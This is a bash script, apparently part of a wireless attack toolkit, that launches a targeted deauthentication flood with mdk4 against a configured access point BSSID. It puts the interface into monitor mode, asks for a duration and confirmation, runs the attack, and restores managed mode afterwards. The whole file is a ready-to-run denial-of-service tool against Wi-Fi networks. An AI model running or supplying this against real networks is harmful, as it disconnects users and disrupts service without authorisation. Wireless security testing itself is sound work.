#!/bin/bash
# Utility: Manual Deauth Flood using mdk4
# 
# Description:
#   Launches a targeted deauthentication flood using mdk4 against a specified BSSID.
#
# Requirements:
#   - mdk4 must be installed and in PATH
#   - Must be run with sudo/root privileges
#   - Interface must support monitor mode (automatically handled)
#
# Usage:
#   ./run_mdk4_deauth.sh
#
# Inputs:
#   - Wireless interface (e.g. wlan0)
#   - Target BSSID (e.g. AA:BB:CC:DD:EE:FF)
#   - Attack duration in seconds (optional; defaults to config value)
#
# Example:
#   ./run_mdk4_deauth.sh
#
# Notes:
#   - Automatically enables monitor mode if needed
#   - Cleans up on SIGINT or timeout using EXIT trap
#   - Resets MAC address to hardware default before launch

# Load helpers
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
source "$SCRIPT_DIR/config.sh"
source "$SCRIPT_DIR/print.sh"

# Cleanup
cleanup() {
    print_blank
    print_info "Starting cleanup"
    rm -f /tmp/watt_attack_active

    # Check mode
    MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
    if [[ "$MODE" != "managed" ]]; then
        print_action "Reverting to Managed mode"
        bash "$SCRIPT_DIR/set-mode-managed.sh"
        print_success "Interface set to Managed mode"
    fi

    exit 0   
}

# Exit traps
trap cleanup EXIT
trap cleanup SIGINT

# Validate config vars
if [[ -z "$INTERFACE" || -z "$BSSID" || -z "$CHANNEL" ]]; then
    print_warn "INTERFACE, BSSID, or CHANNEL not defined in config.sh"
    exit 1
fi

# Check mdk4
if ! command -v mdk4 &> /dev/null; then
    print_fail "mdk4 not found. Please install it first."
    exit 1
fi

# Display config
echo "Interface    : $INTERFACE"
echo "Target BSSID : $BSSID"
echo "Channel      : $CHANNEL"
echo "Mode         : T007 - Deauthentication Flood"
print_blank

# Confirm attack
read -rp "[?] Proceed with attack? (y/N): " confirm
if [[ "$confirm" != "y" && "$confirm" != "Y" ]]; then
    print_warn "Cancelled"
    exit 0
fi

# Input duration
while true; do
    print_prompt "Duration (seconds) [default]: ${T007_ATTACK_DURATION}]: "
    read -r DURATION

    DURATION="${DURATION:-$T007_ATTACK_DURATION}"
    
    if [[ "$DURATION" =~ ^[0-9]+$ ]]; then
        break
    else
        print_fail "Invalid input. Enter a numeric value (seconds)"
    fi
done

# Launch attack
echo "T007" > /tmp/watt_attack_active
print_blank
print_info "Starting Attack"

# Check mode
MODE=$(iw dev "$INTERFACE" info | awk '/type/ {print $2}')
if [[ "$MODE" != "monitor" ]]; then
    print_action "Enabling Monitor mode"
    bash "$SCRIPT_DIR/set-mode-monitor.sh"
    print_success "Interface set to Monitor mode"
fi

# Run attack
print_blank
print_info "Running mdk4 for $DURATION seconds"
sudo timeout "$DURATION" mdk4 "$INTERFACE" d -B "$BSSID" -c "$CHANNEL"
EXIT_CODE=$?

# Exit check
if [[ "$EXIT_CODE" -eq 124 ]]; then
    print_success "Attack ended"
elif [[ "$EXIT_CODE" -ne 0 ]]; then
    print_fail "mdk4 exited with code $EXIT_CODE"
fi

exit 0